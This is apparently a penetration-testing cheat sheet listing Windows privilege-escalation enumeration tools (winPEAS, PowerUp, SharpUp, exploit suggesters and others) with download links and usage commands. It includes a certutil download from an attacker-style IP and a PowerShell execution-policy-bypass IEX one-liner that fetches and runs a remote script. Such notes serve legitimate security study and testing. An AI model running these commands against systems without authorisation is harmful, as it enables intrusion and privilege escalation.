
##  EXE Tools (Run as .exe files)
### accesschk.exe
AccessChk is an old but still trustworthy tool **for checking user access control rights.**

You can use it to check whether a user or group has access to files, directories, services, and registry keys.
The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an **/accepteula** command line option.
```
https://xor.cat/assets/other/Accesschk.zip
```
**Always do this first**
```
accesschk.exe /accepteula (always do this first!!!!!)
```
**Find all weak file permission per drive.**
```
accesschk.exe -uwqs Users c:\*.*

accesschk.exe -uwqs "Authenticated Users" c:\*.*
```
**Find all weak folder permission per drive**
```
accesschk.exe -uwdqs Users c:\

accesschk.exe -uwdqs "Authenticated Users" c:\
```

###  winPEAS.exe
- **Job:** Checks for many weaknesses: services, passwords, file access, registry, etc.
- **Download:** https://github.com/carlospolop/PEASS-ng/releases
- **Download:**  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
- **Run it:**
```
winPEAS.exe
```
Before running, we need to add a registry key and then reopen the command prompt:
```
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
Run all checks while avoiding time-consuming searches:
```
.\winPEASany.exe quiet cmd fast
```
Run specific check categories:
```
.\winPEASany.exe quiet cmd systeminfo
```
###  Seatbelt.exe
- **Job:** Shows security info like saved passwords, browser history, installed apps.
- **Source:** https://github.com/GhostPack/Seatbelt
- ⚠️ You must compile it  before use.
### ✅ SharpUp.exe
- **Job:** Looks for ways to become admin, like bad file or service permissions.
- **Source:** https://github.com/GhostPack/SharpUp
- ⚠️ Needs to be compiled.
### ✅ Watson.exe
- **Job:** Finds known Windows bugs (CVEs) that work on this system.
- **Source:** https://github.com/rasta-mouse/Watson
- ⚠️ Compile before use.

---
#  PowerShell Scripts (.ps1 files)

###  PowerUp.ps1
- **Job:** Checks services, registry, DLLs, paths, etc. for privilege issues.
- **Download (local):** certutil -urlcache -split -f "http://10.17.68.184:8000/PowerUp.ps1" PowerUp.ps1
- **Download:** https://github.com/PowerShellMafia/PowerSploit
- **Download:** https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps
- **Use it:**
```
CMD> powershell -exec bypass

PS> . .\PowerUp.ps1

PS> Invoke-AllChecks

# Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
```
or
```
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```

### Sherlock.ps1
- **Job:** Finds missing Windows updates that attackers can use.
- **Download:** https://github.com/rasta-mouse/Sherlock
- **Use it:**

```
Import-Module .\Sherlock.ps1
Find-AllVulnerabilities
```

### ✅ JAWS-enum.ps1

- **Job:** Checks logs, users, firewall, AV, and more.
- **Download:** https://github.com/411Hall/JAWS
- **Use it:**
```
.\JAWS-enum.ps1
```

---
#  Python Tools (Run on your system)

###  windows-exploit-suggester.py
- **Job:** Shows possible Windows bugs based on system info.
- **Download:** https://github.com/AonCyberLabs/Windows-Exploit-Suggester
- **Steps:**
```
systeminfo > sysinfo.txt          # Get system info from target
./windows-exploit-suggester.py -i sysinfo.txt
```

###  Windows Exploit Suggester - NG (WES-NG)
- **Job:** Updated version of the above tool.
- **Download:** https://github.com/bitsadmin/wesng
- **Steps:**
```
./wes.py --update                 # Update CVE list
systeminfo > sysinfo.txt          # Get system info
./wes.py sysinfo.txt              # Get exploit suggestions
```

###  Metasploit Exploit Suggester

- **Job:** Shows escalation options in Meterpreter session.
- **Module: `post/multi/recon/local_exploit_suggester`**
